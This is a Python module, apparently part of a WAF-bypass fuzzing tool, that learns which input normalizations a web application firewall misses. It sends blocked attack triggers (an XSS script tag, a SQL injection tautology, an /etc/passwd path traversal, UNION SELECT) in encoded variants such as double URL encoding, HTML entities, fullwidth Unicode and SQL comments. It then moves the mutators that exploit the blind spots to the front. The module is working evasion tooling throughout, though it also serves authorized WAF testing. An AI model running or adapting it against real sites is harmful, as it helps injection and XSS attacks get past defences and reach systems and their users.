"""D1 — GOFA-lite normalization-model learner.

GOFA/SFADiff learn a WAF's filter by membership queries (send string, observe
block/pass) and target the gaps. This is the pragmatic, regular (non-automata)
core of that idea: take a payload the WAF blocks, apply one normalization-probe
at a time, and observe whether the WAF still blocks it.

  variant still BLOCKED  => the WAF normalizes that transform away (it decodes/
                            folds it before matching) — useless for evasion.
  variant now THROUGH    => the WAF is BLIND to that transform — a real gap the
                            backend may still decode. Aim mutations there.

The result turns blind search into informed search: the engine reorders its
mutator set so the transforms this WAF cannot see come first. Pure binary
feedback, no WAF score needed.
"""
from __future__ import annotations

import urllib.parse
from dataclasses import dataclass, field

from ..core.oracle import Oracle

# default triggers: canonical attack tokens a competent WAF should block.
DEFAULT_TRIGGERS = [
    "<script>alert(1)</script>",
    "' OR 1=1-- -",
    "../../../../etc/passwd",
    "UNION SELECT NULL",
]


def _fullwidth(s: str) -> str:
    return "".join(chr(ord(c) + 0xFEE0) if 0x21 <= ord(c) <= 0x7E else c for c in s)


# each probe: name, transform(trigger)->variant, and the REGISTRY mutator names it
# vindicates when the WAF turns out BLIND to it.
PROBES = [
    ("case_fold", lambda t: t.upper(),
     ["case_toggle", "case_random", "case_upper", "keyword_case_random", "xss_event_case"]),
    ("url_decode", lambda t: urllib.parse.quote(t, safe=""),
     ["url_all", "url_special", "mixed_percent", "percent_u_unicode"]),
    ("double_url_decode", lambda t: urllib.parse.quote(urllib.parse.quote(t, safe=""), safe=""),
     ["double_url", "triple_url", "mixed_single_double_url", "double_encode_keywords"]),
    ("html_entity_decode", lambda t: "".join(f"&#{ord(c)};" for c in t),
     ["html_entity_dec", "html_entity_hex", "html_entity_special", "html5_entity_named",
      "decimal_entity_angle", "hex_entity_angle", "xss_entity_no_semicolon"]),
    ("unicode_fold", _fullwidth,
     ["unicode_fullwidth", "unicode_nfkc_fold", "case_fold_preimage"]),
    ("comment_strip", lambda t: (t.replace(" ", "/**/") if " " in t else t[:2] + "/**/" + t[2:]),
     ["sql_inline_comment", "sql_intra_keyword_comment", "intra_keyword_comment",
      "sql_versioned_comment", "xss_comment_break"]),
    ("whitespace_fold", lambda t: (t.replace(" ", "\t") if " " in t else t),
     ["whitespace_tab", "whitespace_newline", "space_to_mysql_comment"]),
]


@dataclass
class NormProfile:
    trigger: str = ""
    waf_detected: bool = False
    applies: dict = field(default_factory=dict)       # probe -> WAF normalizes it (sees through)
    blind_to: list = field(default_factory=list)      # probes the WAF cannot see (gaps)
    recommended_mutators: list = field(default_factory=list)
    requests: int = 0

    def as_dict(self) -> dict:
        return {"trigger": self.trigger, "waf_detected": self.waf_detected,
                "applies": self.applies, "blind_to": self.blind_to,
                "recommended_mutators": self.recommended_mutators, "requests": self.requests}


def learn_normalization(oracle: Oracle, *, triggers=None, probes=PROBES) -> NormProfile:
    prof = NormProfile()
    triggers = list(triggers or DEFAULT_TRIGGERS)

    # pick the first trigger the WAF actually blocks as our membership-query base
    trigger = None
    for t in triggers:
        if oracle.send(t).verdict == "BLOCKED":
            trigger = t
            break
    if trigger is None:
        prof.requests = oracle.requests
        return prof  # nothing blocked -> can't learn (no WAF, or everything blocked)

    prof.trigger = trigger
    prof.waf_detected = True

    for name, fn, exploited_by in probes:
        try:
            variant = fn(trigger)
        except Exception:
            continue
        if not variant or variant == trigger:
            continue
        resp = oracle.send(variant)
        # BLOCKED again => WAF normalized it away (applies). THROUGH => WAF blind.
        normalized = (resp.verdict == "BLOCKED")
        prof.applies[name] = normalized
        if not normalized and resp.verdict != "DOWN":
            prof.blind_to.append(name)
            prof.recommended_mutators.extend(exploited_by)

    # dedup recommended, preserve order
    seen = set()
    prof.recommended_mutators = [m for m in prof.recommended_mutators
                                 if not (m in seen or seen.add(m))]
    prof.requests = oracle.requests
    return prof


def reorder_mutators(mutators, profile: NormProfile):
    """Return the mutator list with WAF-blind-exploiting mutators moved to the front."""
    if not profile or not profile.recommended_mutators:
        return mutators
    rec = set(profile.recommended_mutators)
    front = [m for m in mutators if m.name in rec]
    back = [m for m in mutators if m.name not in rec]
    return front + back
